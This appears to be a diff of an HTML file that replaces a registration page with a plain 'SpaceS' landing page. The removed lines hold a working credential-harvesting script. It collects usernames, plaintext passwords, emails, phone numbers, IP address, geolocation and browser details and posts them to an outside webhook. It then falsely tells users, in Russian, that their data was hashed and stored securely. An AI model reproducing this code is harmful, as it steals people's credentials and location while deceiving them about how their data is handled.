@@ -1,258 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registration</title>
-<style>
-body {
-font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-background: linear-gradient(to right, #0f0c29, #302b63, #24243e);
-color: #fff;
-margin: 0;
-padding: 0;
-display: flex;
-justify-content: center;
-align-items: center;
-height: 100vh;
-}
-.container {
-background-color: rgba(255, 255, 255, 0.1);
-padding: 30px;
-border-radius: 10px;
-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
-width: 400px;
-position: relative;
-}
-h1 {
-text-align: center;
-color: #fff;
-margin-bottom: 20px;
-}
-form {
-margin-bottom: 20px;
-}
-label {
-display: block;
-margin-top: 10px;
-color: #fff;
-font-weight: bold;
-}
-input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
-width: calc(100% - 20px);
-padding: 10px;
-margin-top: 5px;
-border: 1px solid #ccc;
-border-radius: 5px;
-box-sizing: border-box;
-font-size: 16px;
-background-color: rgba(255, 255, 255, 0.1);
-color: #fff;
-}
-button {
-margin-top: 20px;
-padding: 15px 20px;
-background-color: #6a3093;
-color: white;
-border: none;
-border-radius: 5px;
-cursor: pointer;
-width: 100%;
-box-sizing: border-box;
-font-size: 16px;
-font-weight: bold;
-}
-button:hover {
-background-color: #a044ff;
-}
-.language-selector {
-position: absolute;
-top: 10px;
-right: 10px;
-}
-#showPassword {
-margin-top: 10px;
-}
-.disclaimer {
-font-size: 12px;
-text-align: center;
-margin-top: 20px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SpaceS - A modern platform to connect, share, and engage with your community.">
+    <meta name="keywords" content="social media, messaging, community, SpaceS">
+    <meta name="author" content="SpaceS Team">
+    <title>SpaceS - Connect & Share</title>
+    <style>
+        /* Основные цвета */
+        :root {
+            --primary-color: #a855f7;
+            --background-color: #0d0d0d;
+            --secondary-color: #1a1a1a;
+            --text-color: #ffffff;
+            --light-bg: #f7f7f7;
+            --light-text: #000000;
+        }
+
+        [data-theme="light"] {
+            --background-color: var(--light-bg);
+            --text-color: var(--light-text);
+            --secondary-color: #eaeaea;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 10%;
+            background: var(--secondary-color);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            transition: background 0.3s;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+
+        nav {
+            display: flex;
+            gap: 15px;
+        }
+
+        nav a {
+            text-decoration: none;
+            color: var(--text-color);
+            font-size: 16px;
+            padding: 8px 15px;
+            border-radius: 6px;
+            transition: background 0.3s;
+        }
+
+        nav a:hover {
+            background: var(--primary-color);
+        }
+
+        .theme-toggle {
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: var(--text-color);
+            transition: color 0.3s;
+        }
+
+        main {
+            margin-top: 60px;
+        }
+
+        .hero-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 80px 20px;
+            background: linear-gradient(120deg, var(--secondary-color), #3a3a3a);
+        }
+
+        .hero-section h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, var(--primary-color), var(--text-color));
+            -webkit-background-clip: text;
+            color: transparent;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .hero-section p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.6;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .hero-section button {
+            margin-top: 30px;
+            padding: 15px 30px;
+            font-size: 18px;
+            background: var(--primary-color);
+            color: var(--text-color);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+            animation: fadeInUp 2.5s ease-in-out;
+        }
+
+        .hero-section button:hover {
+            background: #7817df;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px 10px;
+            background: var(--secondary-color);
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-<div class="language-selector">
-<select id="language" onchange="changeLanguage()">
-<option value="en">English</option>
-<option value="ru">Русский</option>
-</select>
-</div>
-<h1>Registration</h1>
-<form id="registrationForm">
-<label for="username">Username:</label>
-<input type="text" id="username" name="username" required><br>
-<label for="password">Password:</label>
-<input type="password" id="password" name="password" required><br>
-<input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password<br>
-<label for="email">Email:</label>
-<input type="email" id="email" name="email" required><br>
-<label for="phone">Phone Number:</label>
-<input type="tel" id="phone" name="phone" required><br>
-<button type="button" onclick="sendData()">Register</button>
-</form>
-<div class="disclaimer">Please ensure your email and phone number are correct as they cannot be changed later.</div>
-<div id="result"></div>
-</div>
+    <header>
+        <div class="logo">SpaceS</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Features</a>
+            <a href="#">About</a>
+            <a href="#">Sign Up</a>
+        </nav>
+        <button class="theme-toggle" onclick="toggleTheme()">Light Mode</button>
+    </header>
 
-<script>
-function changeLanguage() {
-var language = document.getElementById('language').value;
-if (language === 'ru') {
-document.querySelector('h1').textContent = 'Регистрация';
-document.querySelector('label[for="username"]').textContent = 'Имя пользователя:';
-document.querySelector('label[for="password"]').textContent = 'Пароль:';
-document.querySelector('label[for="email"]').textContent = 'Электронная почта:';
-document.querySelector('label[for="phone"]').textContent = 'Номер телефона:';
-document.querySelector('button').textContent = 'Регистрация';
-document.querySelector('#showPassword').nextSibling.textContent = ' Показать пароль';
-document.querySelector('.disclaimer').textContent = 'Пожалуйста, убедитесь, что ваш email и номер телефона верны, так как их нельзя будет изменить позже.';
-} else {
-document.querySelector('h1').textContent = 'Registration';
-document.querySelector('label[for="username"]').textContent = 'Username:';
-document.querySelector('label[for="password"]').textContent = 'Password:';
-document.querySelector('label[for="email"]').textContent = 'Email:';
-document.querySelector('label[for="phone"]').textContent = 'Phone Number:';
-document.querySelector('button').textContent = 'Register';
-document.querySelector('#showPassword').nextSibling.textContent = ' Show Password';
-document.querySelector('.disclaimer').textContent = 'Please ensure your email and phone number are correct as they cannot be changed later.';
-}
-}
+    <main>
+        <section class="hero-section">
+            <div>
+                <h1>Welcome to SpaceS</h1>
+                <p>
+                    Discover a new way to connect and share with your community. SpaceS brings together messaging, updates, and endless possibilities for interaction.
+                </p>
+                <button onclick="scrollToFeatures()">Explore Features</button>
+            </div>
+        </section>
+    </main>
 
-function togglePassword() {
-var passwordField = document.getElementById('password');
-if (passwordField.type === 'password') {
-passwordField.type = 'text';
-} else {
-passwordField.type = 'password';
-}
-}
+    <footer>
+        <p>&copy; 2025 SpaceS. All rights reserved.</p>
+    </footer>
 
-function sendData() {
-var username = document.getElementById('username').value;
-var password = document.getElementById('password').value;
-var email = document.getElementById('email').value;
-var phone = document.getElementById('phone').value;
-var userAgent = navigator.userAgent;
-var screenWidth = window.screen.width;
-var screenHeight = window.screen.height;
-var language = navigator.language;
+    <script>
+        const toggleTheme = () => {
+            const currentTheme = document.body.dataset.theme;
+            const newTheme = currentTheme === "light" ? "dark" : "light";
+            document.body.dataset.theme = newTheme;
+            document.querySelector(".theme-toggle").textContent = 
+                newTheme === "light" ? "Dark Mode" : "Light Mode";
+        };
 
-navigator.geolocation.getCurrentPosition(function(position) {
-fetch('https://api.ipify.org?format=json')
-.then(response => response.json())
-.then(data => {
-var ip = data.ip;
-
-fetch(`https://ipapi.co/${ip}/json/`)
-.then(response => response.json())
-.then(locationData => {
-sendLocationData(ip, locationData);
-sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude, locationData);
-})
-.catch(() => {
-sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude);
-});
-})
-.catch(() => {
-sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, null, position.coords.latitude, position.coords.longitude);
-});
-}, function(error) {
-console.error(error);
-sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language);
-});
-}
-
-function sendLocationData(ip, locationData) {
-var payload = {
-content: `**Location Data**
-**IP:** ${ip}
-**ISP:** ${locationData.org ? locationData.org : 'N/A'}
-**ASN:** ${locationData.asn ? locationData.asn : 'N/A'}
-**Location:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}` : 'N/A'}
-**Address:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}, ${locationData.postal}` : 'N/A'}
-**Time Zone:** ${locationData.timezone ? locationData.timezone : 'N/A'}
-**Country Code:** ${locationData.country ? locationData.country : 'N/A'}
-**Region Code:** ${locationData.region_code ? locationData.region_code : 'N/A'}
-**Currency:** ${locationData.currency ? locationData.currency : 'N/A'}
-**Languages:** ${locationData.languages ? locationData.languages : 'N/A'}
-**Continent Code:** ${locationData.continent_code ? locationData.continent_code : 'N/A'}
-**Country Population:** ${locationData.country_population ? locationData.country_population : 'N/A'}
-**Country Area:** ${locationData.country_area ? locationData.country_area : 'N/A'}
-**EU:** ${locationData.in_eu ? locationData.in_eu : 'N/A'}
-**Calling Code:** ${locationData.country_calling_code ? locationData.country_calling_code : 'N/A'}
-**Postal:** ${locationData.postal ? locationData.postal : 'N/A'}`,
-embeds: null,
-attachments: []
-};
-
-fetch('https://hkdk.events/i2yc29qumnotdn', {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify(payload)
-})
-.then(response => {
-if (response.ok) {
-console.log('Location data sent successfully');
-} else {
-console.log('Failed to send location data');
-}
-})
-.catch(error => {
-console.error('Error:', error);
-});
-}
-
-function sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip = null, latitude = null, longitude = null, locationData = {}) {
-var payload = {
-content: `**New Registration**
-**Username:** ${username}
-**Password:** ${password}
-**Email:** ${email}
-**Phone:** ${phone}
-**IP:** ${ip ? ip : 'N/A'}
-**User Agent:** ${userAgent}
-**Screen Resolution:** ${screenWidth}x${screenHeight}
-**Language:** ${language}
-**Latitude:** ${latitude ? latitude : 'N/A'}
-**Longitude:** ${longitude ? longitude : 'N/A'}`,
-embeds: null,
-attachments: []
-};
-
-fetch('https://hkdk.events/i2yc29qumnotdn', {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify(payload)
-})
-.then(response => {
-if (response.ok) {
-document.getElementById('result').innerText = 'Ваши данные были захэшированы и безопасно сохранены в нашей базе данных.';
-console.log('Registration data sent successfully');
-} else {
-document.getElementById('result').innerText = 'Регистрация не удалась!';
-console.log('Failed to send registration data');
-}
-})
-.catch(error => {
-console.error('Error:', error);
-document.getElementById('result').innerText = 'Регистрация не удалась!';
-});
-}
-</script>
+        const scrollToFeatures = () => {
+            document.getElementById("features")?.scrollIntoView({ behavior: "smooth" });
+        };
+    </script>
 </body>
 </html>
